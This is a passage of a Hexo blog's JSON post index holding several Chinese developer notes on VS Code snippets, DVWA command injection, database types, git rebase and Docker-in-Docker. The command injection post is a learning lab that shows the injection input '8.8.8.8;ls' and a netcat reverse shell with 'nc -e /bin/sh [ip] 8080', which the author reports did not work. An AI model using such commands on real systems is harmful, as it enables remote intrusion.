&#123;</span><br><span class=\"line\">  \t\t<span class=\"attr\">\"prefix\"</span>: <span class=\"string\">\"!more\"</span>,</span><br><span class=\"line\">  \t\t<span class=\"attr\">\"body\"</span>: [</span><br><span class=\"line\">    \t\t\t<span class=\"string\">\"&lt;!--more--&gt;\"</span></span><br><span class=\"line\">  \t\t],</span><br><span class=\"line\">  \t\t<span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Read More\"</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"asset_img\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"prefix\"</span>: <span class=\"string\">\"asset\"</span>,</span><br><span class=\"line\">    \t<span class=\"attr\">\"body\"</span>: [</span><br><span class=\"line\">    \t\t<span class=\"string\">\"&#123;% asset_img $&#123;1:img.png&#125; $&#123;1:title&#125; %&#125;\"</span></span><br><span class=\"line\">  \t\t],</span><br><span class=\"line\">  \t\t<span class=\"attr\">\"description\"</span>: <span class=\"string\">\"asset_img\"</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"asset_link\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"prefix\"</span>: <span class=\"string\">\"asset\"</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"body\"</span>: [</span><br><span class=\"line\">\t\t<span class=\"string\">\"&#123;% asset_link $&#123;1:url&#125; $&#123;1:title&#125; %&#125;\"</span></span><br><span class=\"line\">\t\t],</span><br><span class=\"line\">\t\t<span class=\"attr\">\"description\"</span>: <span class=\"string\">\"asset_link\"</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>這三個寫文章應該很夠用</p>\n<p>##參考來源<br><a href=\"https://pawelgrzybek.github.io/snippet-generator/?description=asset_link&amp;tabtrigger=asset_link&amp;snippet=&amp;mode=vscode\" target=\"_blank\" rel=\"noopener\">snippet generator</a></p>\n","categories":["寫程式一些事"],"tags":["snippet","vscode"]},{"title":"Command Injection 小記","url":"/blog/2020/12/07/Command-Injection-%E5%B0%8F%E8%A8%98/","content":"<p>command injection </p>\n<p>平常沒什麼看過<br>今天程式做弱點掃描發現這個問題<br>程式call web service 掃出弱點<br>等等web service 怎麼掃出 command injection ，改不會是誤判了<br>本片重點在 command injection</p>\n<a id=\"more\"></a>\n<ul>\n<li><a href=\"https://medium.com/blacksecurity/metasploitable-dvwa-command-injection-9c092e180d0\" target=\"_blank\" rel=\"noopener\">Metasploitable 學習筆記-DVWA Command injection 命令注入攻擊與 Reverse Shell | by Kuro Huang | 資安工作者的學習之路 | Medium</a></li>\n</ul>\n<p>裡面談到 reverse shell 也滿有趣的，本篇用 dvwa 試跑一次</p>\n<ul>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10242080\" target=\"_blank\" rel=\"noopener\">資安這條路 07 - [Injection] Command injection - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10221819\" target=\"_blank\" rel=\"noopener\">那個夜裡的資安-22(Reverse Shell) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n</ul>\n<h2 id=\"安裝-dvwa\"><a href=\"#安裝-dvwa\" class=\"headerlink\" title=\"安裝 dvwa\"></a>安裝 dvwa</h2><p>參考:</p>\n<ul>\n<li><a href=\"https://www.freebuf.com/articles/web/123779.html\" target=\"_blank\" rel=\"noopener\">新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS - FreeBuf网络安全行业门户</a></li>\n<li><a href=\"https://www.freebuf.com/sectool/102661.html\" target=\"_blank\" rel=\"noopener\">新手指南：手把手教你如何搭建自己的渗透测试环境 - FreeBuf网络安全行业门户</a></li>\n</ul>\n<p>這邊使用 docker 安裝 dvwa</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm -it -p 80:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>\n<p>用在那一台(docker)，使用 localhost 才連的到<br>使用<code>http://localhost/setup.php</code></p>\n<p>按下去<code>Create / Reset database</code> 按鈕，會自動跳回登入頁面</p>\n<blockquote>\n<p>   Username: admin<br>   Password: password</p>\n</blockquote>\n<h2 id=\"Command-injection\"><a href=\"#Command-injection\" class=\"headerlink\" title=\"Command injection\"></a>Command injection</h2><p>進到左邊的<code>Command injection</code><br>輸入欄位<code>8.8.8.8;ls</code>做查詢，這樣就能看到 ls 也能被執行</p>\n<h2 id=\"reverse-shell-失敗\"><a href=\"#reverse-shell-失敗\" class=\"headerlink\" title=\"reverse shell (失敗)\"></a>reverse shell (失敗)</h2><h3 id=\"docker-測試環境沒有-netcat\"><a href=\"#docker-測試環境沒有-netcat\" class=\"headerlink\" title=\"docker 測試環境沒有 netcat\"></a>docker 測試環境沒有 netcat</h3><p>docker 安裝 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it 63 bash</span><br><span class=\"line\"><span class=\"comment\"># 63 試 container ID</span></span><br><span class=\"line\">apt update</span><br><span class=\"line\">apt install -y netcat</span><br></pre></td></tr></table></figure>\n<p>得知測試環境 docker ip</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker inspect 63 | grep IP</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class=\"line\">&quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class=\"line\">&quot;SecondaryIPAddresses&quot;: null,</span><br><span class=\"line\">&quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class=\"line\">&quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class=\"line\">&quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class=\"line\">&quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class=\"line\">&quot;IPPrefixLen&quot;: 16,</span><br><span class=\"line\">&quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class=\"line\">        &quot;IPAMConfig&quot;: null,</span><br><span class=\"line\">        &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class=\"line\">        &quot;IPPrefixLen&quot;: 16,</span><br><span class=\"line\">        &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class=\"line\">        &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class=\"line\">        &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br></pre></td></tr></table></figure>\n<p>這邊我們看到 docker IP 為 <code>172.17.0.2</code><br>不過這邊需要讓 docker 連我的本機 IP ，如: <code>192.168.1.1</code></p>\n<ul>\n<li><a href=\"https://malagege.github.io/blog/2020/02/14/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/\">socat 實用網路工具 和 使用解析 unix socket 方法 | 程式狂想筆記</a></li>\n</ul>\n<p>nc 環境在docker 環境無法使用…<br>有空再研究，睡覺</p>\n<pre><code>在Kali執行nc -vv -l -p 8080\n在網頁執行nc -e /bin/sh [ip] 8080\n執行指令\n</code></pre><p>有空來測試<a href=\"https://app.vagrantup.com/mmckinst/boxes/dvwa\" target=\"_blank\" rel=\"noopener\">Vagrant box mmckinst/dvwa - Vagrant Cloud</a></p>\n<p>## </p>\n","categories":["Linux"]},{"title":"DBeaver交易功能使用方法(Transaction)","url":"/blog/2019/04/20/DBeaver%E4%BA%A4%E6%98%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-Transaction/","content":"<p>因為最近公司要測試刪除功能<br>但是很怕誤刪自己 localhost 資料<br>在想有什麼方法可以簡單測試<br>後來想到<code>交易功能</code></p>\n<a id=\"more\"></a>\n<p><a href=\"https://xyz.cinc.biz/2013/05/mysql-transaction.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: MySQL 交易功能 Transaction 整理</a></p>\n<p>在這篇能簡單看到用法<br>不過，我最近工作環境只裝 DBeaver<br>所以在想有什麼方案<br>最後有想到用交易功能</p>\n<p>其實很簡單，只要連線 DB，<code>F3</code>開啟 new Script<br>確定上面是否連線指定<code>DB</code></p>\n\n\n<p>下面還有一些設定<br>聽說是跟 Isolation 有關係<br>這個我就不清楚了<br>有時間在了解一下，我映像中好像有些設定 db 查詢時候<br>db 會 lock，聽說跟這個有關係</p>\n<p><a href=\"https://medium.com/getamis/database-transaction-isolation-a1e448a7736e\" target=\"_blank\" rel=\"noopener\">資料庫交易的 Isolation – getamis – Medium</a></p>\n<p>參考來源:<br><a href=\"https://github.com/dbeaver/dbeaver/wiki/Auto-and-Manual-Commit-Modes\" target=\"_blank\" rel=\"noopener\">Auto and Manual Commit Modes · dbeaver/dbeaver Wiki</a><br><a href=\"https://github.com/dbeaver/dbeaver/wiki/Pending-Transactions\" target=\"_blank\" rel=\"noopener\">Pending Transactions · dbeaver/dbeaver Wiki</a></p>\n","categories":["MySQL"],"tags":["mysql","dbeaver","transaction"]},{"title":"Content-Range 小記","url":"/blog/2019/06/27/Content-Range-%E5%B0%8F%E8%A8%98/","content":"<p>最近做音樂串流， IOS 發生了不能播放音樂問題<br>找了很久，看了一下封包<br>結果發現一見很怪的事情</p>\n<a id=\"more\"></a>\n<p>IOS 發送 <code>Range: bytes=0-1</code><br>但是 Server 正常回傳<br>但 IOS 會無限發送 <code>Range: bytes=0-1</code></p>\n<ul>\n<li><a href=\"https://wil.dog/2016/09/07/streaming-with-flask/\" target=\"_blank\" rel=\"noopener\">记一则流媒体传输上的坑 | Wildog</a></li>\n<li><a href=\"https://www.jianshu.com/p/d0dbd3196a8e\" target=\"_blank\" rel=\"noopener\">iOS h5 点播播放 mp4 视频遇到的坑,ios 的 h5 不能播放视频等 - 简书</a></li>\n<li><p><a href=\"https://blog.wj2015.com/2018/03/10/%E4%BD%BF%E7%94%A8php%E8%AF%BB%E5%8F%96%E8%A7%86%E9%A2%91%E6%B5%81%EF%BC%8Cios%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E8%A7%82%E7%9C%8B%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/\" target=\"_blank\" rel=\"noopener\">使用 PHP 读取视频流，IOS 系统无法观看的问题解决方法 – Jeffrey Wang 的个人博客</a></p>\n</li>\n<li><p><a href=\"https://www.jianshu.com/p/a9360d0ff316\" target=\"_blank\" rel=\"noopener\">Swift HTTPURLResponse 的一个坑 - 简书</a></p>\n</li>\n<li><a href=\"https://phantomvk.github.io/2018/12/13/HTTP2_Header_lower_case/\" target=\"_blank\" rel=\"noopener\">HTTP/2 约束 Header 大小写 - phantomVK Blog</a></li>\n</ul>\n<p>簡單小記</p>\n<p>request header:<br>Range: bytes=0-x</p>\n<p>response header:<br>Content-Length: 0-x/n</p>\n<p><a href=\"https://dabing1022.github.io/2016/12/24/%E8%81%8A%E4%B8%80%E8%81%8AHTTP%E7%9A%84Range,%20Content-Range/\" target=\"_blank\" rel=\"noopener\">聊一聊 HTTP 的 Range, Content-Range | HappyCoding:)</a></p>\n<h2 id=\"延升想法\"><a href=\"#延升想法\" class=\"headerlink\" title=\"延升想法\"></a>延升想法</h2><p>最近同事串流 CDN 服務<br>再想用這種 <code>Range</code>用 https 去做 Range 感覺沒有到很方便<br>現在很多用 hls(m3u8)方式，可能就不會遇到這種問題 orz</p>\n<p>剛打完就剛好看到有人講到<a href=\"https://www.zhihu.com/question/41818719\" target=\"_blank\" rel=\"noopener\">video 标签在 iPhone 手机上不能播放？万能的知乎大神请指引我，实在没办法了 - 知乎</a></p>\n","categories":["HTML"],"tags":["range"]},{"title":"DB存時間格式有哪些型態可以用(經驗分享)","url":"/blog/2019/02/18/DB%E5%AD%98%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9E%8B%E6%85%8B%E5%8F%AF%E4%BB%A5%E7%94%A8-%E7%B6%93%E9%A9%97%E5%88%86%E4%BA%AB/","content":"<p>之前不同公司 db 使用型態都不太一樣<br>前一間公司試用<code>varchar</code><br>現在是用 datetime 預設值<code>0000-00-00</code><br>最近在想這個預設值有甚麼好處</p>\n<a id=\"more\"></a>\n<p>首先，一直搞不清楚不用 Null，印象中 Null 在做 Index 不是很好<br>我自己想出結論，這個可能可以優化 Index key<br>‘0000-00-00’大部分跟 NULL 一樣(<a href=\"https://dev.mysql.com/doc/refman/8.0/en/using-date.html\" target=\"_blank\" rel=\"noopener\">https://dev.mysql.com/doc/refman/8.0/en/using-date.html</a>)<br>但是看到 MySQL 之後版本預設 sql_mode 有 NO_ZERO_IN_DATE,NO_ZERO_DATE<br>不能使用’0000-00-00’，感覺 MySQL 官方預設都不建議用’0000-00-00’<br>我有特別 Google 一下，感覺兩種都有人在用</p>\n<ul>\n<li><a href=\"https://www.sitepoint.com/community/t/datetime-null-or-0000-00-00-00-00-00/49216\" target=\"_blank\" rel=\"noopener\">Datetime NULL or 0000-00-00 00:00:00 - Databases - The SitePoint Forums</a></li>\n<li><a href=\"https://stackoverflow.com/questions/12482560/default-date-0000-00-00-000000-or-null?fbclid=IwAR3OymTlPF517hx7lWUii1rvWgoVN__N3w12Gds3L9cyyPmnzIWP8XSNfUk\" target=\"_blank\" rel=\"noopener\">mysql - default date ‘0000-00-00 00:00:00’ or null - Stack Overflow</a></li>\n</ul>\n<p>感覺大多留言是偏向使用<code>null</code></p>\n<p>不過，我有去社群問問大家<a href=\"https://www.facebook.com/groups/616369245163622/permalink/1554464451354092/\" target=\"_blank\" rel=\"noopener\">Backend 台灣 (Backend Tw)</a></p>\n<blockquote>\n<p>int / timestamp/ datetime 這三種來記錄<br>在大量資料來做搜索時(沒索引)<br>效能是 int &gt; UNIX_TIMESTAMP &gt; timestamp &gt; datetime<br>有索引<br>效能是 UNIX_TIMESTAMP &gt; int &gt; timestamp &gt; datetime</p>\n</blockquote>\n<blockquote>\n<p>一般用框架的，都是 timestamp ，而且沒有就是 0，這樣子最快，只是需要轉換而已</p>\n</blockquote>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"DB到底有沒有boolean型態呢","url":"/blog/2018/11/09/DB%E5%88%B0%E5%BA%95%E6%9C%89%E6%B2%92%E6%9C%89boolean%E5%9E%8B%E6%85%8B%E5%91%A2/","content":"<p>最近做<code>SELECT TRUE</code> 在SQL的時候<br>發現adminer跑出來結果是<code>1</code><br>覺得有點不科學</p>\n<a id=\"more\"></a>\n<p>在很久的時候，MySQL操作phpmyadmin設定欄位都會看到有boolean這個選項<br>就以為boolean有這個東西<br>由於過去大學專題java都是用rs.getBoolean(xxx)也沒有發現這個問題</p>\n<p>上一間公司是使用DB2都用varchar(1) [Y,N]<br>所以沒有遇過這個問題</p>\n<p>今天遇到這個狀況有點錯愕orz<br>覺得怪怪的</p>\n<p>最後網路查了一下，MySQL實做上會把boolean當tinyint(1)使用</p>\n<p>DB2剛好開docker玩<br>下sql發現不能新增boolean欄位型態!!!<br>Google一下發現db2沒有boolean型態<br>sql server,db2 做<code>select True from xxxxx(依照db不能)</code><br>會產生錯誤</p>\n<p>這時候我就很好奇oracle,sql server到底有沒有這個東西(boolean)</p>\n<p>這邊簡單記錄<br>mysql,postgres 有 boolean 型態<br>oracle,sql server, db2都不能用boolean</p>\n<p>SQL92建義用bit，但是oracle推使用number</p>\n<p>目前我同事是使用tinyint(1)，不過他也不知道sql server沒有boolean型態….</p>\n<p>可參考以下內容</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/3751853/boolean-vs-tinyint1-for-boolean-values-in-mysql\" target=\"_blank\" rel=\"noopener\">sql - Boolean vs tinyint(1) for boolean values in MySQL - Stack Overflow</a></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">其中， linq to sql 自然就將 IsRetired 欄位當成 boolean 值，0 是 false, 1 是 true. 這在 sql server 是相當自然而沒有疑慮的事情。 </span><br><span class=\"line\">那在 Oracle 呢？Oracle 是資料庫的老大，當然不需要 follow 標準。(所以別怪 MS Office 不照 OpenDocument format (ODF) 的標準，而要自行搞一套 Office Open Xml 的標準) </span><br><span class=\"line\">Oracle 不支援 bit 的 datatype，甚至在 Oracle vs. SQL Server中也指明了，bit 的相等的oracle 表達法是 number(1, 0)。 </span><br><span class=\"line\">是否我們需要存 boolean 值時，在oracle 就宣告成 number(1, 0) 呢？ </span><br><span class=\"line\">將來如果出了一個 linq to oracle 的 privider，是否看到 number(1, 0) 就自行轉成 boolean 呢？ 看了很多前人的程式，都是自行定義的，如 char(1)，然後寫入值為 &apos;0&apos; 或 &apos;1&apos; ，也有寫成 &apos;Y&apos; 或 &apos;N&quot;，當然也有 &apos;y&apos; 或 &apos;n&apos;。 </span><br><span class=\"line\">實在令人頭痛。 </span><br><span class=\"line\">如果是您，不知道您會如何宣告呢？</span><br></pre></td></tr></table></figure>\n<p>突然想到我上一間公司是使用db2<br>那時候他們說只用<code>varchar</code>型態<br>boolean幾乎都是用<code>Y</code>,<code>N</code><br>那時候也不知道為什麼…<br>現在終於知道了<br>只不過這樣註解是不是都要特別記?</p>\n<ul>\n<li><a href=\"https://bbs.csdn.net/topics/30054994\" target=\"_blank\" rel=\"noopener\">请问db2有boolean数据类型吗？？-CSDN论坛</a></li>\n<li><a href=\"http://menjoy.iteye.com/blog/111737\" target=\"_blank\" rel=\"noopener\">DB2中类似于ORACLE中的DUAL表的表 - Menjoy’s 技术文摘 - ITeye博客</a></li>\n<li><a href=\"http://charlesbc.blogspot.com/2008/08/oracle-3-boolean.html\" target=\"_blank\" rel=\"noopener\">程湘之間: Oracle 學習(3) boolean 的資料欄位</a></li>\n<li><a href=\"https://blog.csdn.net/H12KJGJ/article/details/52785108\" target=\"_blank\" rel=\"noopener\">关于oracle的boolean问题 - mrdu_somefun的博客 - CSDN博客</a></li>\n</ul>\n<p>然後我翻我買的MySQL裡面也沒有提到Boolean這型態!!!!<br>看來錯誤觀念要修正…</p>\n","categories":["SQL"],"tags":["mysql","sql","db2"]},{"title":"Discord apikey exposed on GitHub不小心上傳api key","url":"/blog/2019/05/12/Discord-apikey-exposed-on-GitHub%E4%B8%8D%E5%B0%8F%E5%BF%83%E4%B8%8A%E5%82%B3api-key/","content":"<p>今天 git push 前幾天寫的 blog 內容<br>收到<code>Discord apikey exposed on GitHub</code><br>看了一下信，好像我上傳 apikey 到 github 上面</p>\n<a id=\"more\"></a>\n\n<blockquote>\n<p>GitGuardian detected an API key from Discord in the following commit from **** pushed at 2019-05-11T17:52:24Z.<br>GitGuardian, or “GG”, is a “Good Guy” bot scanning in real time GitHub commits for sensitive information.<br>Once you have pushed sensitive information to GitHub, this information is public and should be considered compromised. We just open sourced our GitHub repository to help developers take appropriate actions. Would love a star! :)<br>Accidents happened to the best of us and will continue to happen. Sign up to our service to be notified if this happens again. We got a free tier for individual developers !</p>\n</blockquote>\n<p>看了一下，我還真的把 discord api key 傳上去<br>這時候我就用 git rebase 環原去修正裡面內容</p>\n<p>先去.deploy_git 裡面下<code>git rebase -i xxxx^</code><br>要修正的 commit 請記得改<code>edit</code>再<code>:wq</code><br><strong>修改完內容記得用<code>git rebase --continue</code></strong><br>不是下<code>git commit</code>!!!!</p>\n<p><a href=\"https://github.com/twtrubiks/Git-Tutorials/blob/master/README.md\" target=\"_blank\" rel=\"noopener\">Git-Tutorials/README.md at master · twtrubiks/Git-Tutorials · GitHub</a><br>平常沒什麼機會用到<br>今天碰到了 XD</p>\n<p>不過 hexo deploy 的網頁檔沒有抓到<br>他是抓到我上傳 markdown 檔案<br>看來不會對大檔案做簡查</p>\n","categories":["寫程式一些事"]},{"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","url":"/blog/2020/01/12/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/","content":"<p>最近做大量資料處理<br>我想使用 RabbitMQ 處理大量資料<br>不過這個方式 RabbitMQ 會遇到 Work 需要一開始常駐<br>不能做到自動調整控制 Work 數量<br>所已採用 DinD 觀念去實作</p>\n<a id=\"more\"></a>\n<p>DIND 就是 Docker in Docker<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker:latest version</span><br></pre></td></tr></table></figure></p>\n<p>然後容器裡面的 Container 可以跟 docker.sock 做溝通<br>相關可以控制方法 (Docker )</p>\n<ul>\n<li><a href=\"https://docs.docker.com/develop/sdk/examples/\" target=\"_blank\" rel=\"noopener\">Examples using the Docker Engine SDKs and Docker API | Docker Documentation</a></li>\n<li><a href=\"https://blog.fundebug.com/2017/04/17/about-docker-sock/\" target=\"_blank\" rel=\"noopener\">关于/var/run/docker.sock | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现</a></li>\n</ul>\n<p>更多 Unix-socket 方式可以參考<br><a href=\"https://docs.docker.com/engine/api/v1.24/\" target=\"_blank\" rel=\"noopener\">Engine API v1.24 | Docker Documentation</a><br><a href=\"https://docs.docker.com/engine/api/v1.40/\" target=\"_blank\" rel=\"noopener\">Docker Engine API v1.40 Reference</a></p>\n<p>看到這個方式突然想到之前 COSCUP 有看到 Serverless 方式去做</p>\n<ul>\n<li><a href=\"https://philipz.github.io/serverless.html\" target=\"_blank\" rel=\"noopener\">Philipz Docker Lab. - Serverless 架構 &amp; Docker</a></li>\n<li><a href=\"https://www.docker.com/blog/building-serverless-apps-with-docker/\" target=\"_blank\" rel=\"noopener\">Building serverless apps with Docker - Docker Blog</a></li>\n<li><a href=\"https://read01.com/RRQMLQ.html\" target=\"_blank\" rel=\"noopener\">無伺服器架構 - 壹讀</a></li>\n<li><a href=\"https://github.com/bfirsh/serverless-docker\" target=\"_blank\" rel=\"noopener\">bfirsh/serverless-docker: Build serverless apps with Docker</a></li>\n<li><a href=\"https://github.com/bfirsh/serverless-docker-voting-app\" target=\"_blank\" rel=\"noopener\">bfirsh/serverless-docker-voting-app: A serverless web app built with Docker</a></li>\n<li><a href=\"https://linux.cn/article-7525-1.html\" target=\"_blank\" rel=\"noopener\">技术|用 Docker 创建 serverless 应用</a></li>\n</ul>\n<p>但由於要限制 docker 執行數量<br>可以使用 Redis 用程式邏輯限制數量<br>不過要如何實作，這篇不是重點</p>\n<h3 id=\"php-使用-socket-方式連-docker\"><a href=\"#php-使用-socket-方式連-docker\" class=\"headerlink\" title=\"php 使用 socket 方式連 docker\"></a>php 使用 socket 方式連 docker</h3><p>參考官網文章</p>\n<ul>\n<li><a href=\"https://www.php.net/manual/en/function.stream-socket-client.php\" target=\"_blank\" rel=\"noopener\">PHP: stream_socket_client - Manual</a></li>\n<li><a href=\"https://docs.docker.com/develop/sdk/examples/\" target=\"_blank\" rel=\"noopener\">Examples using the Docker Engine SDKs and Docker API | Docker Documentation</a></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl --unix-socket /var/run/docker.sock -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">  -d <span class=\"string\">'&#123;\"Image\": \"alpine\", \"Cmd\": [\"echo\", \"hello world\"]&#125;'</span> \\</span><br><span class=\"line\">  -X POST http:/v1.24/containers/create</span><br></pre></td></tr></table></figure>\n<p>發現 curl 需要 7.4 以上才有 unix-socket 連結功能<br>但使用 php curl 沒有這個問題</p>\n<p>可以看到以下參考<br>使用前請記得 <code>docker pull alpine</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$file_p = stream_socket_client(<span class=\"string\">\"unix:///var/run/docker.sock\"</span>, $errno, $errstr, <span class=\"number\">30</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$file_p) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"$errstr ($errno)&lt;br /&gt;\\n\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    fwrite($file_p, <span class=\"string\">\"POST /containers/create HTTP/1.1\\nHost: v1.24\\nContent-Type: application/json\\nContent-Length: 51\\nConnection: Close\\n\\n&#123;\\\"Image\\\": \\\"alpine\\\", \\\"Cmd\\\": [\\\"echo\\\", \\\"hello world\\\"]&#125;\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!feof($file_p)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> fgets($file_p, <span class=\"number\">1024</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fclose($file_p);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>Connection: Close</code> 需要加，否則程式不會退出!!<br>仔細想想這樣也滿有道理，需要切斷 socket 連線<br>Content-Length 需要注意<code>{&quot;Image&quot;: &quot;alpine&quot;, &quot;Cmd&quot;: [&quot;echo&quot;, &quot;hello world&quot;]}</code>這個長度<br>不對的話會有問題</p>\n<p>最後，程式用 DinD 要如何傳值到程式裡面，這也是一個不錯思考問題<br>畢竟會遇到跳脫字元(\\)，可能使用外部資源(file,mysql,redis)會是比較安全方式</p>\n<ul>\n<li><a href=\"http://blog.kenyang.net/2011/12/12/telnet-post\" target=\"_blank\" rel=\"noopener\">如何用Telnet POST資料</a></li>\n</ul>\n<p>對外 socket 連結可以改成 tcp 開頭</p>\n<p>誤打誤撞，發現這個好像不錯工具<a href=\"https://plantegg.github.io/2019/04/04/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E6%8A%93%E5%8C%85--Unix-Socket%E6%8A%93%E5%8C%85/\" target=\"_blank\" rel=\"noopener\">就是要你懂Unix Socket 进行抓包解析 | plantegg</a><a href=\"/blog/2020/01/12/Docker-in-Docker-DinD-和-RabbitMQ-解決大量資料方法小記/web2.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://plantegg.github.io/2019/10/12/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7--ss%E7%94%A8%E6%B3%95%E5%A4%A7%E5%85%A8/\" target=\"_blank\" rel=\"noopener\">就是要你懂网络监控–ss用法大全 | plantegg</a><br><a href=\"https://plantegg.github.io/2019/06/21/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E6%8A%93%E5%8C%85--WireShark%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%89%88tshark/\" target=\"_blank\" rel=\"noopener\">就是要你懂抓包–WireShark之命令行版tshark | plantegg</a></p>\n<h2 id=\"衍生問題\"><a href=\"#衍生問題\" class=\"headerlink\" title=\"衍生問題\"></a>衍生問題</h2><h3 id=\"RabbitMQ-的-worker-要如何關小保持關掉中程式可以正常結束\"><a href=\"#RabbitMQ-的-worker-要如何關小保持關掉中程式可以正常結束\" class=\"headerlink\" title=\"RabbitMQ 的 worker 要如何關小保持關掉中程式可以正常結束\"></a>RabbitMQ 的 worker 要如何關小保持關掉中程式可以正常結束</h3><p>這個問題，我沒有在網路上爬到。<br>不過我自己想這個問題，在設計 worker 這條路應該要做到 <code>已經做過</code> 和 <code>尚未執行成功</code> 中斷程式<br>下次執行也能應該也要正常執行才對</p>\n<h2 id=\"RabbitMQ-連續大量錯誤\"><a href=\"#RabbitMQ-連續大量錯誤\" class=\"headerlink\" title=\"RabbitMQ 連續大量錯誤\"></a>RabbitMQ 連續大量錯誤</h2><p><a href=\"https://medium.com/@lalayueh/%E5%A6%82%E4%BD%95%E5%84%AA%E9%9B%85%E5%9C%B0%E5%9C%A8rabbitmq%E5%AF%A6%E7%8F%BE%E5%A4%B1%E6%95%97%E9%87%8D%E8%A9%A6-c050efd72cdb\" target=\"_blank\" rel=\"noopener\">如何優雅地在RabbitMQ實現失敗重試 - lala - Medium</a>  <a href=\"/blog/2020/01/12/Docker-in-Docker-DinD-和-RabbitMQ-解決大量資料方法小記/web1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://stackoverflow.com/questions/23158310/how-do-i-set-a-number-of-retry-attempts-in-rabbitmq\" target=\"_blank\" rel=\"noopener\">.net - How do I set a number of retry attempts in RabbitMQ? - Stack Overflow</a><br>其他問題想到再說</p>\n<h2 id=\"rabbitmq-持久化\"><a href=\"#rabbitmq-持久化\" class=\"headerlink\" title=\"rabbitmq 持久化\"></a>rabbitmq 持久化</h2><p>有 Queue 持久化<br>有 Message 持久化</p>\n<h2 id=\"rabbitmq-定義-Queue-不能修改\"><a href=\"#rabbitmq-定義-Queue-不能修改\" class=\"headerlink\" title=\"rabbitmq 定義 Queue 不能修改\"></a>rabbitmq 定義 Queue 不能修改</h2><h2 id=\"autoack-與-max\"><a href=\"#autoack-與-max\" class=\"headerlink\" title=\"autoack 與 max-\"></a>autoack 與 max-</h2><p>可能要確定 autoack = true 時候， server 馬上發送 message 給 worker ??</p>\n<p><a href=\"https://www.kancloud.cn/longxuan/rabbitmq-arron/107717\" target=\"_blank\" 